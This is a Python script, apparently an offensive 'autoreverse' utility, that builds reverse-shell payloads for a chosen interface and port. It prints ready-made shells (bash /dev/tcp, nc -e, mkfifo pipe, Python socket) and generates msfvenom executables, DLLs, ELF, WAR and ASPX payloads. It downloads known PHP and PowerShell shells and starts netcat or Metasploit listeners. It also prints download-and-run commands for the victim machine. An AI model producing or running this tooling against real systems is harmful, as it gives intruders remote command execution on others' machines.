#!/usr/bin/python3

from simple_colors import *
import os, argparse, socket, time

ap = argparse.ArgumentParser()

ap.add_argument('-I', '--interface', required=True, type=str, help='Select the network interface.')

ap.add_argument('-P', '--port', required=True, type=str, help='Select the port you want to use.')

ap.add_argument('-p', '--payload', required=True, type=str, help='Select the payload (php, bash, nc, oldnc, exe, dll, ps1, elf, war, aspx or python).')

ap.add_argument('-l', '--listener', required=False, type=str, help='Create a listener with netcat or metasploit (meterpreter): nc or msf (msf only works with .exe, .dll, .aspx and .elf payloads).')

ap.add_argument('-a', '--architecture', required=False, type=str, help='Define the architecture of the machine: x64 or x86 (default value is x64, only needed with .exe, .dll and .elf payloads).')

ap.add_argument('-http', '--httpserver', required=False, type=str, help='Create an http server on the port you specified.')

args = ap.parse_args()

ActualPath = os.popen('pwd').read().replace('\n', '')

if os.path.exists('/usr/local/bin/autoreverse.py') == False:
    print(blue('\nCreating a symbolik link so you can use the tool in all directories (autoreverse.py).'))
    os.system('dos2unix autoreverse.py 2>/dev/null')
    os.system('chmod +x autoreverse.py')
    os.system('ln -s ' + ActualPath + '/autoreverse.py /usr/local/bin/autoreverse.py')

payload = args.payload.lower()

if payload.isnumeric():
    print(red('The payload must be a string.'))
    exit()

arch = str(args.architecture).lower()

port = args.port

try:
    int(port)
    if args.httpserver != None:
        int(args.httpserver)
except:
    print(red('The port must be a number.'))
    exit()

def Get_IP(NT = args.interface):
    IP = os.popen("ifconfig " + str(NT) + " 2>/dev/null | sed -n '2 p' | awk '{print $2}'").read().replace('\n', '')
    if IP == '':
        print(red("Your network interface doesn't exist."))
        exit()
    else:
        return IP

def nc_list():
    if payload == 'exe' or payload == '.exe' or payload == 'dll' or payload == '.dll':
        os.system('rlwrap nc -lvnp ' + str(port))
    else:
        os.system('nc -lvnp ' + str(port))

def msf_list(IP = Get_IP(), PORT = port):
    print(blue('Setting up your listener in metasploit.\n'))
    print(green('Waiting to say I\'m in...\n'))
    command = 'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp ;set LHOST ' + IP + ' ;set LPORT ' + PORT + ' ; exploit" 2>/dev/null'
    if (arch == 'x86' or arch == '86') and (payload == '.exe' or payload == 'exe' or payload == '.dll' or payload == 'dll' or payload == 'aspx' or payload == '.aspx'):
        command = command.replace('/x64', '')
        os.system(command)
        exit()
    elif arch == 'x86' or arch == '86':
        command = command.replace('x64', 'x86')
    if payload == '.exe' or payload == 'exe' or payload == '.dll' or payload == 'dll' or payload == 'aspx' or payload == '.aspx':
        os.system(command)
    else:
        os.system(command.replace('windows', 'linux'))

def message(file, ActualPath = ActualPath):
    print(blue(('\nYour payload ' + red(file) + blue(' is located in ') +  red(ActualPath) + blue(' and ready to upload.\n'))))

def Check_files(file):
    path = '/opt/autoreverse/'
    if os.path.exists(path) == False:
        os.system('mkdir ' + path)
    filelink = {
        'autoreverse.php': 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php',
        'autoreverse.ps1': 'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1'
    }
    if os.path.exists(path + file) == False:
        print('\nDownloading ' + blue(file) + ' in ' + path + '\n')
        os.system('wget ' + filelink[file] + ' -O ' + path + file + ' 2>/dev/null')
        os.system('chmod 777 ' + path + file)
        print(blue(file) + green(' downloaded.\n'))

def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
    
    msfvenom = 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=' + str(IP) + ' LPORT=' + str(PORT) + ' -f exe > autoreverse.exe 2>/dev/null'

    if msf == True:
        msfvenom = msfvenom.replace('shell_', 'meterpreter/')
    if (arch == 'x86' or arch == '86') and (payload == '.exe' or payload == 'exe' or payload == '.dll' or payload == 'dll'):
        msfvenom = msfvenom.replace('/x64', '')
    elif arch == 'x86' or arch == '86':
        msfvenom = msfvenom.replace('x64', 'x86')

    if payload == 'oldnc':
        print(blue('\nYour payload is:\n\n') + red('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + IP + ' ' + PORT + ' >/tmp/f'))
    elif payload == 'bash':
        print(blue('\nYour payload is:\n\n') + red('bash -i >& /dev/tcp/' + IP + '/' + PORT + ' 0>&1'))
    elif payload == 'nc':
        print(blue('\nYour payload is:\n\n') + red('nc -e /bin/sh ' + IP + ' ' + PORT))
    elif payload == 'python' or payload == '.py':
        print(blue('\nYour payload is:\n\n') + red("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + IP + "\"," + PORT + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"))
    elif payload == 'php' or payload == '.php':
        file = 'autoreverse.php'
        Check_files(file)
        os.system('cp /opt/autoreverse/autoreverse.php .')
        with open('autoreverse.php', 'r') as archivo:
            data = archivo.readlines()
        with open('autoreverse.php', 'w') as archivo:
            data[48] = "$ip = '" + IP + "';\n"
            data[49] = "$port = " + PORT + ";\n"
            archivo.writelines(data)
        if args.httpserver != None:
            print(blue('\nDownload your payload on the victim machine with: ') + red("\nwget http://" + IP + ":" + args.httpserver + "/" + file))
        message(file)
    elif payload == 'elf' or payload == '.elf':
        file = 'autoreverse.elf'
        print(blue('\nCreating the payload, please wait.'))
        msfvenom = msfvenom.replace('windows', 'linux').replace('exe', 'elf')
        os.system(msfvenom)
        if args.httpserver != None:
            print(blue('\nDownload your payload on the victim machine with: ') + red("\nwget http://" + IP + ":" + args.httpserver + "/" + file))
        message(file)
    elif payload == 'war' or payload == '.war':
        file = 'autoreverse.war'
        print(blue('\nCreating the payload, please wait.'))
        msfvenom = msfvenom.replace('windows/x64/','java/jsp_').replace('exe','war')
        os.system(msfvenom)
        message(file)
    elif payload == 'aspx' or payload == '.aspx':
        file = 'autoreverse.aspx'
        print(blue('\nCreating the payload, please wait.'))
        msfvenom = msfvenom.replace('/x64','').replace('exe','aspx')
        os.system(msfvenom)
        message(file)
    elif payload == 'powershell' or payload == 'ps1' or payload == '.ps1':
        file = 'autoreverse.ps1'
        Check_files(file)
        os.system('cp /opt/autoreverse/autoreverse.ps1 .')
        os.system('echo "Invoke-PowerShellTcp -Reverse -IPAddress ' + IP + ' -Port ' + PORT + '" >> autoreverse.ps1')
        if args.httpserver != None:
            print(blue('\nInvoke your payload on the victim machine with: ') + red("\npowershell IEX(New-Object Net.WebClient).downloadString('http://" + IP + ":" + args.httpserver + "/" + file + "')"))
        message(file)
    elif payload == 'exe' or payload == '.exe':
        file = 'autoreverse.exe'
        print(blue('\nCreating the payload, please wait.'))
        os.system(msfvenom)
        if args.httpserver != None:
            print(blue('\nDownload your payload on the victim machine with: ') + red('\ncurl "http://' + IP + ':' + args.httpserver + '/' + file + '" -o autoreverse.exe'))
        message(file)
    elif payload == 'dll' or payload == '.dll':
        file = 'autoreverse.dll'
        print(blue('\nCreating the payload, please wait.'))
        os.system(msfvenom.replace('exe', 'dll'))
        if args.httpserver != None:
            print(blue('\nDownload your payload on the victim machine with: ') + red('\ncurl "http://' + IP + ':' + args.httpserver + '/' + file + '" -o autoreverse.dll'))
        message(file)
    else:
        print(red('Your payload option is not in the list, use "--help" to know the payloads list.'))
        exit()

def Check_Port(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if s.connect_ex(('127.0.0.1', int(port))) == 0:
        process = os.popen('lsof -i -P -n | grep LISTEN | grep ' + port + ' | awk \'{print $1, $2}\'').read().replace('\n', '')
        print(red('The port is already being used by ' + process + '.'))
        exit()

def listeners():
    if args.listener == 'nc' or args.listener == 'netcat':
        if arch == 'none':
            Configure()
        else:
            Configure(arch = arch)
        print(green('\nWaiting to say I\'m in...\n'))
        nc_list()
        exit()
    elif args.listener == 'msf' or args.listener == 'metasploit':
        if arch == 'none':
            Configure(msf = True)
        else:
            Configure(msf = True, arch = arch)
        msf_list()
        exit()
    else:
        print(red('Your listener option is not in the list, use "--help" to know the listeners list.'))
        exit()

if args.httpserver != None:
    Check_Port(args.httpserver)
    server = 'python3 -m http.server ' + str(args.httpserver) + ' > /tmp/autoreverse.log 2>/dev/null &'
    os.system(server)
    time.sleep(0.04)
    process = os.popen('lsof -i -P -n | grep LISTEN | grep ' + str(args.httpserver) + ' | awk \'{print $1, $2}\'').read().replace('\n', '')
    print(blue('\nHTTP server running on port ' + str(args.httpserver) + ' (Process: ' + process + ').'))
if args.listener != None:
    Check_Port(args.port)
    listeners()

Configure()
